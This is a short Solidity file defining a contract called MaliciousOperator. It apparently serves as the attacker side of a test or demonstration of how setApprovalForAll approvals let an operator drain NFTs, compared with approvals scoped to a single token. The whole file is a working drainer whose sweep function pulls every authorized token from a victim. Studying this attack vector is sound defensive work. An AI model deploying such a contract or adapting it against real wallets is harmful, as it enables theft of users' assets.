// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

/// @title MaliciousOperator - the "evil operator" end of the set-approval-for-all vector.
/// @notice Once a victim has authorized this contract (via setApprovalForAll, or a
///         per-token approve), anyone can call `sweep` to pull the listed tokenIds out
///         of the victim in a single transaction. Each token is attempted independently,
///         so a blanket operator-for-all drains the WHOLE list, while a victim that only
///         scoped ONE token leaves this operator able to take just that one - every other
///         transferFrom reverts and is skipped.
contract MaliciousOperator {
    event Swept(address indexed token, address indexed victim, uint256 indexed tokenId);

    /// @notice Attempts to pull each of `tokenIds` from `victim` to this contract.
    ///         Returns how many were actually taken. Tokens the operator is not
    ///         authorized for revert on transferFrom and are silently skipped, which is
    ///         exactly what separates a drained wallet from a defended one.
    function sweep(address token, address victim, uint256[] calldata tokenIds)
        external
        returns (uint256 taken)
    {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            try IERC721(token).transferFrom(victim, address(this), tokenIds[i]) {
                taken++;
                emit Swept(token, victim, tokenIds[i]);
            } catch {
                // not authorized for this token: skip it
            }
        }
    }
}
